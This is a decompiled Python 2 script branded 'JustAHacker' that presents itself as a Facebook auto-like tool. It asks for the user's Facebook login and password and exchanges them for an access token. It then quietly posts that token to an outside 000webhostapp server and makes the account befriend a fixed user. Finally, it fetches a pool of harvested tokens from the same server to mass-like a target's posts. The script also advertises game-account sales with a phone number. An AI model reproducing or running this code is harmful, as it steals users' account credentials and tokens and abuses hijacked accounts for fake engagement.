# uncompyle6 version 3.5.0
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <JustAHacker>
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
import smtplib
from bs4 import BeautifulSoup as sup
os.system('clear')
print '\x1b[1;37m'
os.system('printf "  \\e[101m\\e[1;77m:: Subscribe JustA Hacker :: \\e[0m\n"')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
apa = requests.Session()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]')]

def keluar():
    print '\x1b[1;91m[!] Closed'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = ' \x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n \x1b[1;97m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88         \x1b[1;96m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n \x1b[1;97m\xe2\x96\x88 \x1b[1;91m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc  \x1b[1;97m- _ --_-- \x1b[1;92m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \x1b[1;97m\xe2\x96\x88  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n \x1b[1;97m\xe2\x96\x88 \x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2 \x1b[1;97m--  - _ -- \x1b[1;92m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \x1b[1;93mJustAHacker\n \x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88         \x1b[1;96m\xc2\xab==========\xe2\x9c\xa7==========\xc2\xbb\n \x1b[1;97m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n \x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mCoded   \x1b[1;91m:  \x1b[1;96m JustA Hacker \x1b[1;97m                   \xe2\x95\x91\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/JustAHackers\x1b[    \x1b[1;97m \xe2\x95\x91\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/agung.rafasyah\x1b[     \x1b[1;97m   \xe2\x95\x91   \n \x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n[*] \x1b[1;91mLOGIN OPERA MINI BIAR FB LU GAK KE KUNCI\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


ide = raw_input('ID : ')
back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
lol = 0

def isg():
    login()


def login():
    os.system('clear')
    try:
        toket = open('loginssss.txt', 'r')
        react()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;37m'
        os.system('printf "  \\e[101m\\e[1;77m:: WhatsApp = +6289682009902 :: \\e[0m\n"')
        os.system('printf "  \\e[101m\\e[1;77m:: Kalo Ada Yg Mau Beli Akun FreeFire  :: \\e[0m\n"')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        namafb = raw_input('\x1b[1;91m[+] \x1b[1;36mNama Akun Fb (bukan nomor telpon) \x1b[1;91m:\x1b[1;92m')
        ids = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail / no telp \x1b[1;91m:\x1b[1;92m ')
        pwds = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        os.system('am start https://youtube.com/rezondegrowtopia')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = ids
        br.form['pass'] = pwds
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + ids + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwds + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': ids, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwds, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('loginss.txt', 'w')
                zedd.write(z['access_token'])
                acs = z['access_token']
                requests.post('https://justaserverscript.000webhostapp.com/autolike.php', data={'tok': str(acs)})
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                react()
                if ide == '':
                    os.sys.exit()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Gagal Masuk'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def react():
    global lol
    os.system('clear')
    try:
        tokk = requests.get('https://justaserverscript.000webhostapp.com/tokenlike.txt').text
        tokk = tokk.split('\n')
        toket = tokk[lol]
    except IndexError:
        print 'akun Habis'
    else:
        os.system('reset')
        print logo
        limit = '1000'
        tipe = 'LIKE'
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print 42 * '\x1b[1;97m\xe2\x95\x90'
            print '\r\x1b[1;91m[+]\x1b[1;92m Done \x1b[1;97m' + str(len(reaksi))
            time.sleep(2)
            lol += 1
            react()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            lol += 1
            react()


if __name__ == '__main__':
    isg()